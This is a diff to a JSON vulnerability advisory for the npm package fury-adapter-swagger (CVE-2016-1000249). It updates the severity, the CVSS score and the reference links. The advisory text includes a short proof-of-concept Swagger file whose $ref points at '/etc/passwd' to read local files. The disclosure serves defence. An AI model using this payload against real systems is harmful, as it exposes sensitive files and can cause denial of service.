@@ -1,6 +1,6 @@
 {
-  "Severity": "CRITICAL",
-  "UpdatedAt": "2020-08-31T18:18:38Z",
+  "Severity": "HIGH",
+  "UpdatedAt": "2023-09-11T16:45:35Z",
   "Package": {
     "Ecosystem": "NPM",
     "Name": "fury-adapter-swagger"
@@ -23,6 +23,9 @@
         "Url": "https://github.com/apiaryio/fury-adapter-swagger/commit/f4407e3a5323bc31123d45dbc93b8417002e4d51#diff-54c345dc104dc19440f9c2482b7883df820e8b9b699fdd8fa07e2773e7197a29"
       },
       {
+        "Url": "https://security.snyk.io/vuln/npm:fury-adapter-swagger:20161024"
+      },
+      {
         "Url": "https://github.com/advisories/GHSA-2r7f-4h2c-5x73"
       }
     ],
@@ -36,16 +39,16 @@
         "Value": "CVE-2016-1000249"
       }
     ],
-    "Description": "`fury-adapter-swagger` from version 0.2.0 until version 0.9.7 has a weakness that allows an attacker to read arbitrary files off of the system. This can be used to read sensitive data, or to cause a denial of service condition by attempting to read something like `/dev/zero`.\n\n## Proof of Concept:\n\n```\n---\nswagger: '2.0'\ninfo:\n  title: Read local files\n  version: '1.0'\n\npaths:\n  /foo:\n    get:\n      responses:\n        200:\n          description: Some description\n          examples:\n            text/html:\n              example:\n                $ref: '/etc/passwd'\n```\n\n\n## Recommendation\n\nUpgrade to version 0.9.7 or later.",
+    "Description": "`fury-adapter-swagger` from version 0.2.0 until version 0.9.7 has a weakness that allows an attacker to read arbitrary files off of the system. This can be used to read sensitive data, or to cause a denial of service condition by attempting to read something like `/dev/zero`.\n\n## Proof of Concept:\n\n```yaml\n---\nswagger: '2.0'\ninfo:\n  title: Read local files\n  version: '1.0'\n\npaths:\n  /foo:\n    get:\n      responses:\n        200:\n          description: Some description\n          examples:\n            text/html:\n              example:\n                $ref: '/etc/passwd'\n```\n\n\n## Recommendation\n\nUpgrade to version 0.9.7 or later.",
     "Origin": "UNSPECIFIED",
     "PublishedAt": "2020-09-01T16:38:33Z",
-    "Severity": "CRITICAL",
+    "Severity": "HIGH",
     "Summary": "fury-adapter-swagger allows arbitrary file read from system",
-    "UpdatedAt": "2023-01-11T05:08:12Z",
+    "UpdatedAt": "2023-09-11T16:45:35Z",
     "WithdrawnAt": "",
     "CVSS": {
-      "Score": 0,
-      "VectorString": ""
+      "Score": 7.3,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L"
     }
   },
   "Versions": [
